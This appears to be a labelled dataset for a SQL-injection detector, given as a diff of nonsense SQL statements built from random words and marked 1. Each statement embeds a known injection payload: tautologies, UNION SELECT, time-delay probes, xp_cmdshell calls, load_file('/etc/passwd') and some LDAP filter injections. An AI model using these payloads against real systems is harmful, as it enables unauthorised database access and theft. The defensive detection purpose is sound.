@@ -1,0 +1,1000 @@
+DELETE FROM bells WHERE achieve = declare @q nvarchar (200) 0x730065006c00650063007400200040004000760065007200730069006f006e00 exec(@q) 1 
+INSERT INTO books (plant, note) VALUES (hi' or 'x'='x';,  or ''=') 1 
+INSERT INTO tongue (geese, guitar) VALUES ( -- &password=, 0x770061006900740066006F0072002000640065006C00 ...) 1 
+INSERT INTO coach (spiders, destruction) VALUES (exec(@s), '; exec master..xp_cmdshell 'ping 172.10.1.255'--) 1 
+INSERT INTO chalk (grape, screw) VALUES () union select * from information_schema.tables;, *(|(mail=*))) 1 
+DELETE FROM angle WHERE bridge = â or 1=1 -- 1 
+SELECT cough FROM blow WHERE needle =  select name from syscolumns where id = (sele ... 1 
+DELETE FROM dirt WHERE pie = ') or ('x'='x 1 
+DELETE FROM club WHERE education = ') or ('a'='a 1 
+ALTER TABLE view SET joke = ' or userid like '% WHERE letter = \x27UNION SELECT 1 
+INSERT INTO meal (market, waves) VALUES (t'exec master..xp_cmdshell 'nslookup www.google.com'--, ) or (a=a) 1 
+ALTER TABLE answer SET soda = ' or 1=1 WHERE baby = ' or uname like '% 1 
+SELECT doll FROM kittens WHERE jewel =  and 1=( if((load_file(char(110,46,101,120,11 ... 1 
+INSERT INTO rifle (cloud, carpenter) VALUES (//*, procedure) 1 
+INSERT INTO good-bye (fang, money) VALUES ( or ''=', declare @q nvarchar (4000) select @q =) 1 
+SELECT clover FROM move WHERE respect = //* 1 
+SELECT underwear FROM notebook WHERE pocket = delete 1 
+ALTER TABLE suit SET night =  or 2 between 1 and 3 WHERE move = â or 1=1 -- 1 
+INSERT INTO sneeze (knee, lumber) VALUES ( or 1=1 or ''=', asc) 1 
+INSERT INTO finger (books, trousers) VALUES () or ('a'='a, or 1=1 --) 1 
+INSERT INTO house (town, popcorn) VALUES ('; exec master..xp_cmdshell, 29 %) 1 
+DELETE FROM page WHERE park = hi' or 1=1 -- 1 
+INSERT INTO visitor (jeans, humor) VALUES ( union select,  or 2 between 1 and 3) 1 
+ALTER TABLE afterthought SET monkey = ") or benchmark(10000000,MD5(1))# WHERE skate =  or 1=1 -- 1 
+DELETE FROM crayon WHERE hospital =  or 3=3 1 
+INSERT INTO voyage (van, canvas) VALUES (' or (EXISTS), declare @q nvarchar (4000) select @q =) 1 
+INSERT INTO question (food, zebra) VALUES ( or 0=0 --, /**/or/**/1/**/=/**/1) 1 
+SELECT form FROM rhythm WHERE woman = declare @s varchar(200) select @s = 0x77616974 ... 1 
+DELETE FROM stem WHERE stick = a' 1 
+ALTER TABLE fight SET flight = ' WHERE dust = 3.10E+17 1 
+ALTER TABLE door SET look =  or 1/* WHERE guitar = a' or 1=1-- 1 
+ALTER TABLE canvas SET fang =  or a = a WHERE sound = & 1 
+SELECT reward FROM mice WHERE roof =  or '1'='1'-- 1 
+DELETE FROM cord WHERE hand = *(|(mail=*)) 1 
+DELETE FROM locket WHERE cord =  and 1=( if((load_file(char(110,46,101,120,11 ... 1 
+DELETE FROM cave WHERE trip = or 0=0 -- 1 
+INSERT INTO hydrant (mine, bed) VALUES ( or 1/*,  or benchmark(10000000,MD5(1))#) 1 
+SELECT dress FROM stage WHERE vessel = ) or ('a'='a 1 
+ALTER TABLE giants SET minister = ' UNION SELECT WHERE fifth = as 1 
+SELECT man FROM shade WHERE air = ) 1 
+DELETE FROM squirrel WHERE space = declare @q nvarchar (200) select @q = 0x770061 ... 1 
+ALTER TABLE glass SET clouds =  union select 1,load_file('/etc/passwd'),1,1,1; WHERE cobweb = x' AND userid IS NULL; -- 1 
+INSERT INTO donkey (distribution, sand) VALUES (1;(load_file(char(47,101,116,99,47,112,97,115, ...,  or 0=0 #") 1 
+SELECT zephyr FROM current WHERE title =  or 1/* 1 
+ALTER TABLE hour SET cactus = declare @s varchar (200) select @s = 0x73656c65637420404076657273696f6e exec(@s) WHERE building = declare @s varchar(200) select @s = 0x77616974666F722064656C61792027303A303A31302700 exec(@s)  1 
+DELETE FROM vein WHERE cushion =  or 'whatever' in ('whatever') 1 
+SELECT government FROM plastic WHERE guitar =  or 0=0 -- 1 
+ALTER TABLE care SET box = or 1=1 WHERE range = ' (select top 1 1 
+INSERT INTO able (dinosaurs, wilderness) VALUES (; exec ('sel' + 'ect us' + 'er'), ) or pg_sleep(__TIME__)--) 1 
+INSERT INTO store (statement, hydrant) VALUES (' or uname like '%,  or 'text' > 't') 1 
+ALTER TABLE oranges SET writing = 'sqlattempt1 WHERE blood = bfilename 1 
+DELETE FROM decision WHERE net = )) or pg_sleep(__TIME__)-- 1 
+INSERT INTO impulse (development, stew) VALUES (" or pg_sleep(__TIME__)--, ' or 1 --') 1 
+ALTER TABLE chess SET soup = hi' or 'x'='x'; WHERE dock = select 1 
+DELETE FROM balls WHERE expert = ) union select * from information_schema.tables; 1 
+INSERT INTO dolls (boy, road) VALUES ( or '1'='1'--, ' or 1=1) 1 
+ALTER TABLE berry SET join = ' (select top 1 WHERE thunder = & 1 
+ALTER TABLE meal SET brush = ; exec ('sel' + 'ect us' + 'er') WHERE insurance = ' or ''=' 1 
+INSERT INTO earth (sleep, cemetery) VALUES (||(elt(-3+5,bin(15),ord(10),hex(char(45)))), or isNULL(1/0) /*) 1 
+INSERT INTO day (place, fold) VALUES ( or 'text' > 't', "a"" or 1=1--") 1 
+SELECT basket FROM earthquake WHERE bee = or 1=1 or ""= 1 
+ALTER TABLE dad SET laugh =  or 1=1 or ''=' WHERE tin = or 1 
+DELETE FROM pancake WHERE stocking = â or 3=3 -- 1 
+DELETE FROM pot WHERE machine = ));waitfor delay '0:0:__TIME__'-- 1 
+ALTER TABLE cough SET payment =  or 1=1 or ''=' WHERE teeth = */* 1 
+DELETE FROM direction WHERE condition = declare @q nvarchar (4000) select @q = 1 
+DELETE FROM zebra WHERE value = a' or 'a' = 'a 1 
+ALTER TABLE net SET song = ' UNION ALL SELECT WHERE gun = or 1=1 -- 1 
+INSERT INTO giraffe (uncle, sugar) VALUES ( or 'text' = n'text', 29 %) 1 
+INSERT INTO sisters (grass, woman) VALUES () or sleep(__TIME__)=', 0x77616974666F722064656C61792027303A303A313027 ...) 1 
+ALTER TABLE mist SET eggs = ' or user like '% WHERE pull = Ã½ or 1=1 -- 1 
+INSERT INTO zipper (books, mice) VALUES (limit, )) or benchmark(10000000,MD5(1))#) 1 
+ALTER TABLE ant SET pipe =  or '1'='1 WHERE ground = "hi"") or (""a""=""a" 1 
+ALTER TABLE operation SET fog = declare @q nvarchar (4000) select @q = WHERE bird = ' or userid like '% 1 
+SELECT jail FROM scale WHERE use = */* 1 
+ALTER TABLE skirt SET sound = ' or 1=1 WHERE glue =  or 1=1 -- 1 
+ALTER TABLE clocks SET wilderness = select WHERE fan = distinct 1 
+SELECT nail FROM brass WHERE harmony = declare @s varchar (8000) select @s = 0x73656c ... 1 
+DELETE FROM square WHERE insurance = declare @s varchar (200) select @s = 0x73656c6 ... 1 
+DELETE FROM shade WHERE pail = char@39A+@SELECT 1 
+SELECT interest FROM throne WHERE vessel =  or a = a 1 
+INSERT INTO value (steel, ghost) VALUES (', handler) 1 
+ALTER TABLE week SET front = ' or 1=1 or ''=' WHERE rail = 0 or 1=1 1 
+ALTER TABLE square SET kettle = 1 or 1=1 WHERE society = *(|(objectclass=*)) 1 
+DELETE FROM umbrella WHERE watch =  or 'whatever' in ('whatever') 1 
+SELECT leaf FROM police WHERE man = &apos; OR 1 
+SELECT observation FROM ladybug WHERE worm = x' AND userid IS NULL; -- 1 
+SELECT burn FROM aftermath WHERE hospital = ' 1 
+INSERT INTO father (planes, rock) VALUES (; exec xp_regread, exec(@s)) 1 
+DELETE FROM humor WHERE tongue = ' or 3=3 1 
+INSERT INTO toad (church, tax) VALUES (||6, &apos; OR) 1 
+SELECT group FROM advice WHERE crib = ||'6 1 
+DELETE FROM bushes WHERE trick =  or 'whatever' in ('whatever') 1 
+ALTER TABLE coil SET plants = @variable WHERE horn = ' or 0=0 -- 1 
+DELETE FROM feet WHERE drawer = ;waitfor delay '0:0:__TIME__'-- 1 
+SELECT yarn FROM force WHERE beginner = â or 1=1 -- 1 
+DELETE FROM cord WHERE cart = to_timestamp_tz 1 
+ALTER TABLE quiet SET salt = '; exec master..xp_cmdshell 'ping 172.10.1.255'-- WHERE limit =  (select top 1 1 
+SELECT spot FROM cloud WHERE money =  or 0=0 #" 1 
+SELECT frame FROM servant WHERE swing = 1 or sleep(__TIME__)# 1 
+INSERT INTO argument (bag, garden) VALUES (or 1=1, tz_offset) 1 
+ALTER TABLE bear SET fight = 1) or sleep(__TIME__)# WHERE soup = *(|(mail=*)) 1 
+INSERT INTO approval (moon, request) VALUES (admin' or ', ' or '1'='1'--) 1 
+SELECT books FROM value WHERE authority =  or 'something' = 'some'+'thing' 1 
+SELECT leg FROM mother WHERE ship = ||UTL_HTTP.REQUEST 1 
+SELECT uncle FROM trade WHERE collar =  or '7659'='7659 1 
+DELETE FROM lamp WHERE magic = tz_offset 1 
+INSERT INTO industry (quilt, quarter) VALUES (password:*/=1--,  or 1 --') 1 
+SELECT spring FROM church WHERE vest =  or 1=1 -- 1 
+DELETE FROM hydrant WHERE cabbage = or a=a 1 
+INSERT INTO behavior (wire, island) VALUES () or sleep(__TIME__)=',  or 1=1) 1 
+DELETE FROM interest WHERE kitten =  or 1 in (select @@version)-- 1 
+DELETE FROM planes WHERE railway = hi') or ('a'='a 1 
+INSERT INTO boats (card, rest) VALUES (*(|(mail=*)), '; exec master..xp_cmdshell 'ping 172.10.1.255'--) 1 
+INSERT INTO map (slave, support) VALUES (', " or pg_sleep(__TIME__)--) 1 
+DELETE FROM order WHERE room = ' or ''=' 1 
+DELETE FROM rose WHERE top = ' or uid like '% 1 
+SELECT bread FROM north WHERE punishment = declare @q nvarchar (200) select @q = 0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000 exec(@q) 1 
+ALTER TABLE coach SET wash = declare @s varchar (200) select @s = 0x73656c65637420404076657273696f6e exec(@s) WHERE bike = password:*/=1-- 1 
+INSERT INTO school (rub, woman) VALUES ((,  or a=a--) 1 
+DELETE FROM volleyball WHERE loss = 0x730065006c0065006300740020004000400076006500 ... 1 
+INSERT INTO stop (invention, battle) VALUES (&, ")) or sleep(__TIME__)=") 1 
+DELETE FROM cabbage WHERE reaction = ; exec master..xp_cmdshell 1 
+SELECT beam FROM clover WHERE coil = 1;SELECT * 1 
+INSERT INTO crow (feeling, card) VALUES (" or 1=1--, sqlvuln) 1 
+DELETE FROM design WHERE arm = (sqlvuln) 1 
+SELECT celery FROM name WHERE pump = benchmark(10000000,MD5(1))# 1 
+INSERT INTO haircut (prose, trail) VALUES (declare @s varchar (200) select @s = 0x73656c6 ..., ' or 1=1 or ''=') 1 
+SELECT hands FROM language WHERE fuel = ' or 1=1 1 
+ALTER TABLE price SET copper = (sqlattempt2) WHERE fish = char@39A+@SELECT 1 
+INSERT INTO daughter (finger, face) VALUES ( or 1 --', --sp_password) 1 
+SELECT dime FROM harbor WHERE basin = x' AND 1=(SELECT COUNT(*) FROM tabname); -- 1 
+ALTER TABLE jellyfish SET structure = ")) or benchmark(10000000,MD5(1))# WHERE sheep = " or pg_sleep(__TIME__)-- 1 
+DELETE FROM seed WHERE advice =  or username like char(37); 1 
+DELETE FROM fruit WHERE waves = 1) or pg_sleep(__TIME__)-- 1 
+INSERT INTO hand (face, bushes) VALUES (@variable, â or 1=1 --) 1 
+INSERT INTO rake (soup, potato) VALUES ( or 1=1, )) or pg_sleep(__TIME__)--) 1 
+DELETE FROM bucket WHERE calendar = a' or 'a' = 'a 1 
+DELETE FROM quarter WHERE fire =  or 1=1 /* 1 
+INSERT INTO home (bait, dust) VALUES (' or 1 --', )) or sleep(__TIME__)=') 1 
+INSERT INTO seed (powder, key) VALUES (; exec master..xp_cmdshell 'ping 172.10.1.255'--,  $(sleep 50)) 1 
+DELETE FROM coil WHERE weight = ||'6 1 
+SELECT children FROM wire WHERE month = 1)) or benchmark(10000000,MD5(1))# 1 
+DELETE FROM attempt WHERE addition = @var select @var as var into temp end -- 1 
+SELECT front FROM view WHERE flame = ! 1 
+ALTER TABLE grandmother SET lumber = declare @q nvarchar (4000) select @q = WHERE watch = " or sleep(__TIME__)# 1 
+ALTER TABLE furniture SET donkey = ' UNION ALL SELECT WHERE range = ";waitfor delay '0:0:__TIME__'-- 1 
+ALTER TABLE beef SET body = " or 1=1-- WHERE playground =  or 'a'='a 1 
+SELECT nail FROM fact WHERE hair = 1;SELECT * 1 
+DELETE FROM example WHERE grass = benchmark(10000000,MD5(1))# 1 
+DELETE FROM eye WHERE year = order by 1 
+INSERT INTO hat (ant, goat) VALUES (&, )) or sleep(__TIME__)=') 1 
+SELECT cord FROM start WHERE carpenter = char@39A+@SELECT 1 
+ALTER TABLE chair SET walk =  or a = a WHERE mailbox = exec sp 1 
+DELETE FROM twig WHERE opinion = or 1=1-- 1 
+INSERT INTO comparison (chin, level) VALUES (" or 0=0 --, or a=a) 1 
+INSERT INTO root (underwear, basin) VALUES (bfilename, *(|(mail=*))) 1 
+ALTER TABLE mitten SET rest = --sp_password WHERE goldfish = 0x77616974666F722064656C61792027303A303A313027 ... 1 
+DELETE FROM kite WHERE teaching = ' or 1=1 or ''=' 1 
+ALTER TABLE pig SET tray = /**/or/**/1/**/=/**/1 WHERE meal = *(|(mail=*)) 1 
+SELECT badge FROM appliance WHERE oil = " or "a"="a 1 
+ALTER TABLE look SET jar = ? WHERE toad = 29 % 1 
+SELECT locket FROM truck WHERE paper = ' or 1=1 1 
+ALTER TABLE frame SET sugar = 3.10E+17 WHERE purpose = ")) or pg_sleep(__TIME__)-- 1 
+DELETE FROM paste WHERE leaf = having 1 
+SELECT volcano FROM insect WHERE copper = 1 waitfor delay '0:0:10'-- 1 
+INSERT INTO popcorn (jar, swim) VALUES (--sp_password, 23 OR 1=1) 1 
+ALTER TABLE cook SET business = "hi"") or (""a""=""a" WHERE root =  or 'unusual' = 'unusual' 1 
+SELECT dad FROM engine WHERE smoke = 1) or pg_sleep(__TIME__)-- 1 
+DELETE FROM vein WHERE polish =  or 'unusual' = 'unusual' 1 
+ALTER TABLE bag SET salt = having WHERE respect = @variable 1 
+DELETE FROM bushes WHERE finger =  or 0=0 #" 1 
+DELETE FROM zinc WHERE table = (sqlvuln) 1 
+DELETE FROM man WHERE linen =  select name from syscolumns where id = (sele ... 1 
+ALTER TABLE science SET selection = replace WHERE drink = handler 1 
+INSERT INTO able (animal, brick) VALUES (truncate, 3.10E+17) 1 
+SELECT sun FROM basketball WHERE music = *(|(objectclass=*)) 1 
+DELETE FROM ice WHERE thunder = 1;(load_file(char(47,101,116,99,47,112,97,115, ... 1 
+INSERT INTO downtown (price, air) VALUES ( or '1'='1'--, ; exec master..xp_cmdshell) 1 
+ALTER TABLE range SET ink = ' or 1=1 WHERE flower =  or '7659'='7659 1 
+SELECT quiver FROM point WHERE field = ; exec master..xp_cmdshell 'ping 172.10.1.255'-- 1 
+SELECT nest FROM body WHERE arch = sqlvuln; 1 
+SELECT eggs FROM sister WHERE pain = declare @s varchar(200) select @s = 0x77616974666F722064656C61792027303A303A31302700 exec(@s)  1 
+SELECT note FROM heart WHERE hate = benchmark(10000000,MD5(1))# 1 
+INSERT INTO map (belief, girls) VALUES (' or ''=',  or 2 between 1 and 3) 1 
+SELECT yarn FROM box WHERE underwear = order by 1 
+ALTER TABLE tooth SET land =  or 1=1 or ''=' WHERE sofa = ' or ''=' 1 
+SELECT basin FROM cat WHERE reason =  or 3=3 1 
+SELECT bridge FROM monkey WHERE tramp = declare @s varchar (200) select @s = 0x73656c65637420404076657273696f6e exec(@s) 1 
+INSERT INTO sidewalk (goldfish, brass) VALUES (--sp_password, *(|(objectclass=*))) 1 
+INSERT INTO governor (soup, cat) VALUES (||'6, *(|(objectclass=*))) 1 
+SELECT volleyball FROM knife WHERE attack =  or 'unusual' = 'unusual' 1 
+DELETE FROM wren WHERE quarter = *(|(mail=*)) 1 
+ALTER TABLE jewel SET health = ' WHERE tooth = â or 3=3 -- 1 
+INSERT INTO giants (slave, truck) VALUES (' or 1=1 or ''=', /**/or/**/1/**/=/**/1) 1 
+ALTER TABLE change SET size = ' or 1=1 WHERE mask = or 0=0 #" 1 
+SELECT fire FROM duck WHERE doll = ' or (EXISTS) 1 
+DELETE FROM lettuce WHERE event = '; exec master..xp_cmdshell 1 
+SELECT sink FROM swim WHERE bells =  or 2 between 1 and 3 1 
+ALTER TABLE degree SET trees =  or 1 --' WHERE acoustics = //* 1 
+DELETE FROM wheel WHERE crate = or 0=0 #" 1 
+ALTER TABLE sail SET comfort = sqlvuln WHERE trees = hi or 1=1 --" 1 
+ALTER TABLE camera SET music = ) WHERE mitten = ")) or pg_sleep(__TIME__)-- 1 
+ALTER TABLE feeling SET touch = desc WHERE house = " or pg_sleep(__TIME__)-- 1 
+SELECT pancake FROM substance WHERE cellar =  -- 1 
+SELECT ray FROM ice WHERE swing = declare @q nvarchar (4000) select @q = 1 
+DELETE FROM back WHERE clover = ,@variable 1 
+ALTER TABLE banana SET boy = 'hi' or 'x'='x'; WHERE boat = procedure 1 
+ALTER TABLE cause SET circle =  or x=x WHERE discussion = ;waitfor delay '0:0:__TIME__'-- 1 
+DELETE FROM quill WHERE wound =  and 1=( if((load_file(char(110,46,101,120,11 ... 1 
+ALTER TABLE stem SET caption = " or benchmark(10000000,MD5(1))# WHERE polish = or a = a 1 
+SELECT downtown FROM drain WHERE desk = anything' OR 'x'='x 1 
+ALTER TABLE brick SET punishment =  or a=a WHERE board =  or 'whatever' in ('whatever') 1 
+ALTER TABLE wood SET wax = ' or a=a-- WHERE birds = 3.10E+17 1 
+ALTER TABLE robin SET lead = or a = a WHERE roll = ; or '1'='1' 1 
+ALTER TABLE actor SET cobweb = " or 0=0 -- WHERE elbow = ")) or pg_sleep(__TIME__)-- 1 
+ALTER TABLE cobweb SET stage =  or 'a'='a WHERE place = <>"'%;)(&+ 1 
+INSERT INTO design (police, group) VALUES (; exec ('sel' + 'ect us' + 'er'), insert) 1 
+ALTER TABLE detail SET rest = â or 1=1 -- WHERE chance = password:*/=1-- 1 
+DELETE FROM drop WHERE whip = char@39A+@SELECT 1 
+INSERT INTO substance (cars, plate) VALUES () or (a=a,  (select top 1) 1 
+INSERT INTO division (distance, room) VALUES (1;SELECT *, ) or pg_sleep(__TIME__)--) 1 
+DELETE FROM reward WHERE dime = " or sleep(__TIME__)# 1 
+ALTER TABLE baby SET cakes =  or 0=0 -- WHERE sidewalk = declare @q nvarchar (200) select @q = 0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000 exec(@q) 1 
+SELECT tramp FROM swim WHERE beds = 1;(load_file(char(47,101,116,99,47,112,97,115, ... 1 
+INSERT INTO plantation (pump, pig) VALUES ( or ''=', () 1 
+SELECT wing FROM scene WHERE shoes =  or 0=0 # 1 
+DELETE FROM use WHERE sail = declare @s varchar(200) select @s = 0x77616974666F722064656C61792027303A303A31302700 exec(@s)  1 
+SELECT battle FROM paste WHERE berry = 1 or sleep(__TIME__)# 1 
+SELECT color FROM slip WHERE parent = ||(elt(-3+5,bin(15),ord(10),hex(char(45)))) 1 
+ALTER TABLE scissors SET able = ' or ''=' WHERE system = *| 1 
+DELETE FROM protest WHERE ring = or a = a 1 
+SELECT oven FROM brake WHERE cobweb = " or benchmark(10000000,MD5(1))# 1 
+ALTER TABLE nation SET attraction = & WHERE toy = â or 1=1 -- 1 
+ALTER TABLE company SET needle = hi or a=a WHERE committee = t'exec master..xp_cmdshell 'nslookup www.googl ... 1 
+SELECT tail FROM move WHERE sheet = procedure 1 
+SELECT giraffe FROM food WHERE flavor =  or x=x 1 
+DELETE FROM circle WHERE trains = ! 1 
+INSERT INTO boundary (cable, glove) VALUES (//*,  or ''=') 1 
+ALTER TABLE profit SET volcano = 29 % WHERE burst = 'hi' or 'x'='x'; 1 
+SELECT minister FROM fish WHERE use = x' AND members.email IS NULL; -- 1 
+ALTER TABLE whip SET wealth = ||UTL_HTTP.REQUEST WHERE work = 0 1 
+INSERT INTO mist (swing, skate) VALUES (declare @q nvarchar (200) select @q = 0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000 exec(@q), 1 or benchmark(10000000,MD5(1))#) 1 
+SELECT prose FROM night WHERE arch = declare @s varchar(200) select @s = 0x77616974666F722064656C61792027303A303A31302700 exec(@s)  1 
+SELECT bit FROM credit WHERE shelf = uni/**/on sel/**/ect 1 
+DELETE FROM cause WHERE decision = ' or 0=0 # 1 
+DELETE FROM nose WHERE kittens = (sqlattempt2) 1 
+DELETE FROM silk WHERE title = order by 1 
+ALTER TABLE winter SET train = ' or 1=1-- WHERE shoes = )) or sleep(__TIME__)=' 1 
+ALTER TABLE cup SET station = " or benchmark(10000000,MD5(1))# WHERE drain = exec xp 1 
+SELECT base FROM money WHERE angle =  union all select @@version-- 1 
+DELETE FROM cub WHERE box = ; exec master..xp_cmdshell 1 
+DELETE FROM plot WHERE unit = \x27UNION SELECT 1 
+INSERT INTO rifle (day, goat) VALUES (' or 1=1--, 1) or sleep(__TIME__)#) 1 
+ALTER TABLE hydrant SET stone = 3.10E+17 WHERE ground = hi' or 'x'='x'; 1 
+DELETE FROM yard WHERE badge = 1) or benchmark(10000000,MD5(1))# 1 
+INSERT INTO earthquake (spade, push) VALUES (x' OR full_name LIKE '%Bob%, ") or sleep(__TIME__)=") 1 
+DELETE FROM cup WHERE belief = 1) or pg_sleep(__TIME__)-- 1 
+DELETE FROM prose WHERE hose =  or sleep(__TIME__)# 1 
+SELECT exchange FROM plantation WHERE night = ' or ''=' 1 
+SELECT minute FROM man WHERE answer = x' AND userid IS NULL; -- 1 
+SELECT heart FROM thing WHERE line =  or '7659'='7659 1 
+SELECT push FROM peace WHERE death = // 1 
+ALTER TABLE curve SET clock = or WHERE observation = 26 % 1 
+ALTER TABLE cemetery SET lake =  union select WHERE twist = *(|(objectclass=*)) 1 
+INSERT INTO tank (farmer, join) VALUES (!, ||(elt(-3+5,bin(15),ord(10),hex(char(45))))) 1 
+ALTER TABLE advertisement SET church = a' or 3=3-- WHERE sack =  or 2 between 1 and 3 1 
+INSERT INTO purpose (yak, flight) VALUES (update, hi' or 1=1 --) 1 
+ALTER TABLE chin SET name = hi' or 1=1 -- WHERE light =  or 1=1 or ''=' 1 
+INSERT INTO wrench (bag, head) VALUES (26 %, or a = a) 1 
+SELECT voyage FROM toad WHERE table =  or 'text' = n'text' 1 
+SELECT island FROM cheese WHERE boat = "a"" or 1=1--" 1 
+INSERT INTO jump (trucks, ant) VALUES (0 or 1=1, '; exec xp_regread) 1 
+SELECT thrill FROM caption WHERE kiss = "));waitfor delay '0:0:__TIME__'-- 1 
+DELETE FROM design WHERE nerve = ' or 1=1 1 
+INSERT INTO scene (crib, shock) VALUES (29 %, |) 1 
+SELECT underwear FROM stranger WHERE judge =  UNION ALL SELECT 1 
+SELECT man FROM horn WHERE addition = " or isNULL(1/0) /* 1 
+INSERT INTO gold (death, crime) VALUES (' or uid like '%,  UNION ALL SELECT) 1 
+DELETE FROM train WHERE office = ; exec ('sel' + 'ect us' + 'er') 1 
+DELETE FROM snow WHERE dogs =  group by userid having 1=1-- 1 
+ALTER TABLE yam SET copy = 1 waitfor delay '0:0:10'-- WHERE middle = declare @q nvarchar (200) select @q = 0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000 exec(@q) 1 
+DELETE FROM magic WHERE fowl = declare @q nvarchar (200) 0x730065006c00650063 ... 1 
+ALTER TABLE cattle SET goldfish = declare @s varchar (200) select @s = 0x73656c65637420404076657273696f6e exec(@s) WHERE rat = declare @q nvarchar (4000) select @q = 1 
+INSERT INTO beam (guide, shade) VALUES (' or 1 --', to_timestamp_tz) 1 
+SELECT pocket FROM trick WHERE battle = 1)) or pg_sleep(__TIME__)-- 1 
+ALTER TABLE apples SET rake = or 0=0 # WHERE house = declare @s varchar(200) select @s = 0x77616974 ... 1 
+INSERT INTO punishment (bucket, snails) VALUES (,@variable, ; exec master..xp_cmdshell) 1 
+ALTER TABLE grandmother SET distance = truncate WHERE apples = 0 1 
+ALTER TABLE fire SET orange = ' or username like '% WHERE oil = ;waitfor delay '0:0:__TIME__'-- 1 
+INSERT INTO wheel (quince, advertisement) VALUES ((sqlattempt2), declare @q nvarchar (200) 0x730065006c00650063 ...) 1 
+ALTER TABLE volcano SET station =  union select WHERE week = ') or ('x'='x 1 
+INSERT INTO gun (fact, pest) VALUES (!, ; or '1'='1') 1 
+SELECT cat FROM blow WHERE coil = or 1=1 -- 1 
+ALTER TABLE writer SET earthquake =  -- &password= WHERE coast = 26 % 1 
+ALTER TABLE harbor SET trip = | WHERE wind = ' or uid like '% 1 
+INSERT INTO distance (card, drawer) VALUES () or benchmark(10000000,MD5(1))#, or 0=0 #") 1 
+ALTER TABLE back SET pull = 'sqlattempt1 WHERE hot = --sp_password 1 
+SELECT activity FROM cemetery WHERE straw = (sqlattempt2) 1 
+DELETE FROM summer WHERE brake = 28 % 1 
+INSERT INTO rifle (board, cat) VALUES ( or 'unusual' = 'unusual',  or 'whatever' in ('whatever')) 1 
+INSERT INTO copy (vase, increase) VALUES (hi') or ('a'='a, ' or 'x'='x) 1 
+INSERT INTO flower (relation, hook) VALUES ( or a=a, 0) 1 
+ALTER TABLE harbor SET beetle = ' or 'x'='x WHERE division = ' UNION ALL SELECT 1 
+DELETE FROM tiger WHERE voice = or 1=1 1 
+SELECT mint FROM birthday WHERE swing = " or "a"="a 1 
+SELECT toes FROM word WHERE balls = " or pg_sleep(__TIME__)-- 1 
+INSERT INTO body (sack, woman) VALUES ( or benchmark(10000000,MD5(1))#, ") or sleep(__TIME__)=") 1 
+DELETE FROM unit WHERE pail =  or 'whatever' in ('whatever') 1 
+DELETE FROM summer WHERE foot = ")) or benchmark(10000000,MD5(1))# 1 
+INSERT INTO control (bell, start) VALUES (' or username like '%, 3.10E+17) 1 
+ALTER TABLE day SET seat = )) or pg_sleep(__TIME__)-- WHERE stranger =  or '1'='1'-- 1 
+INSERT INTO approval (judge, wire) VALUES (or 0=0 #",  or 'whatever' in ('whatever')) 1 
+DELETE FROM government WHERE hill = ' UNION ALL SELECT 1 
+SELECT coat FROM quiet WHERE wing =  or 2 between 1 and 3 1 
+SELECT kitty FROM wrench WHERE smash = ) or (a=a 1 
+SELECT talk FROM kettle WHERE mice = ; begin declare @var varchar(8000) set @var=' ... 1 
+INSERT INTO toes (music, quilt) VALUES (||'6,  select name from syscolumns where id = (sele ...) 1 
+ALTER TABLE vase SET digestion =  or 'text' = n'text' WHERE language =  or 1 in (select @@version)-- 1 
+SELECT board FROM sticks WHERE skirt =  and 1=( if((load_file(char(110,46,101,120,11 ... 1 
+DELETE FROM ice WHERE juice =  group by userid having 1=1-- 1 
+INSERT INTO butter (noise, straw) VALUES (t'exec master..xp_cmdshell 'nslookup www.googl ..., 1)) or sleep(__TIME__)#) 1 
+ALTER TABLE finger SET joke = 1 or 1=1 WHERE robin = benchmark(10000000,MD5(1))# 1 
+INSERT INTO friends (street, veil) VALUES ( UNION SELECT,  or '1'='1'--) 1 
+DELETE FROM fowl WHERE voice = "));waitfor delay '0:0:__TIME__'-- 1 
+INSERT INTO flesh (curve, baby) VALUES (declare @s varchar(22) select @s =,  or 'something' = 'some'+'thing') 1 
+SELECT temper FROM watch WHERE insect = ; execute immediate 'sel' || 'ect us' || 'er' 1 
+SELECT river FROM grape WHERE driving =  or 1=1 1 
+SELECT dolls FROM border WHERE surprise = update 1 
+INSERT INTO shape (yarn, branch) VALUES (0 or 1=1, declare @s varchar (8000) select @s = 0x73656c ...) 1 
+ALTER TABLE instrument SET yam = ; exec master..xp_cmdshell WHERE peace = declare @q nvarchar (200) select @q = 0x770061 ... 1 
+ALTER TABLE force SET star = ||'6 WHERE parent = (sqlvuln) 1 
+DELETE FROM error WHERE car = ; exec ('sel' + 'ect us' + 'er') 1 
+SELECT seat FROM fear WHERE expansion = or a = a 1 
+DELETE FROM cart WHERE holiday = 1)) or sleep(__TIME__)# 1 
+ALTER TABLE lettuce SET scissors = (sqlattempt2) WHERE powder = )) or sleep(__TIME__)=' 1 
+INSERT INTO middle (trade, club) VALUES (; exec master..xp_cmdshell 'ping 172.10.1.255'--,  or 'unusual' = 'unusual') 1 
+INSERT INTO yoke (beef, thunder) VALUES (*|, asc) 1 
+DELETE FROM woman WHERE mountain = 23 OR 1=1 1 
+INSERT INTO bubble (wine, trains) VALUES (PRINT, delete) 1 
+INSERT INTO table (sidewalk, monkey) VALUES (28 %, ; execute immediate 'sel' || 'ect us' || 'er') 1 
+SELECT bean FROM pain WHERE seashore = ' UNION ALL SELECT 1 
+DELETE FROM development WHERE tray = (sqlvuln) 1 
+INSERT INTO star (shade, locket) VALUES (declare @s varchar(200) select @s = 0x77616974 ..., x' AND 1=(SELECT COUNT(*) FROM tabname); --) 1 
+DELETE FROM squirrel WHERE cork = &apos; OR 1 
+INSERT INTO year (duck, cook) VALUES ( or 0=0 --, ||(elt(-3+5,bin(15),ord(10),hex(char(45))))) 1 
+ALTER TABLE pancake SET spark = ; execute immediate 'sel' || 'ect us' || 'er' WHERE beggar = ; execute immediate 'sel' || 'ect us' || 'er' 1 
+INSERT INTO tiger (self, religion) VALUES (exec(@s), ' or 0=0 #) 1 
+INSERT INTO field (mass, treatment) VALUES (1) or benchmark(10000000,MD5(1))#, declare @s varchar (200) select @s = 0x73656c6 ...) 1 
+ALTER TABLE loaf SET railway = 0x730065006c0065006300740020004000400076006500 ... WHERE reaction = ||UTL_HTTP.REQUEST 1 
+DELETE FROM earthquake WHERE bushes = ' or a=a-- 1 
